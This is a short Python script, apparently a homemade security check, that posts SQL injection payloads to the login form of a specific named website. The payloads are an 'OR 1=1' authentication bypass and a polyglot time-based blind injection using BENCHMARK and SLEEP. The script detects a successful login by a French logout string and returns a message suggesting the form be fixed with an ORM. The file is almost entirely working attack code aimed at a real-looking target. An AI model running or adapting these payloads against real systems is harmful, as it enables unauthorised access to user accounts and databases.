import requests
import time

class Inject:
    def injectop(self, target):
        data = {
            'login':'marcel" OR 1=1#',
            'status':'1',
            'password':"test",
            'findUs':'IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*\'XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\'|"XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/'
                }
        result = requests.post(target, data)
        page = result.text
        if page.find("déconnecter") != -1:
            return True
        return False
    
    def msgToPDF(self, target):
        if target == "http://orios.louisviallon.fr/login.php":
            if self.injectop(target) == True:
                data = {
                    'login':'marcel" OR 1=1#',
                    'password':'test',
                    'message': 'injection done, Il faudrait revoir les soucis du formulaire ou passé à un ORM'
                }
                return data
        else:
            return "Pas de formulaire login" 

